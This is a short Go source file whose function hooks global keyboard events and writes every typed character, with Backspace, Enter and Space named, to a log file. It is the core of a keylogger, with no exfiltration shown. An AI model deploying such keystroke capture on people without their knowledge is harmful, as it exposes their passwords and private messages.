package main

import (
	"fmt"
	"os"

	hook "github.com/robotn/gohook"
)

func StartEventWriter() {
	file, err := openLogFile()
	if err != nil {
		fmt.Fprintf(os.Stderr, "failed to create log file: %v\n", err)
	}
	defer file.Close()

	events := hook.Start()
	for ev := range events {

		if ev.Kind == hook.KeyHold {

			switch ev.Rawcode {
			case 8:
				file.WriteString("Backspace\n")
			case 13:
				file.WriteString("Enter\n")
			case 32:
				file.WriteString("Space\n")
			default:
				text := string(ev.Keychar) + "\n"
				file.WriteString(text)
			}
		}
	}
}
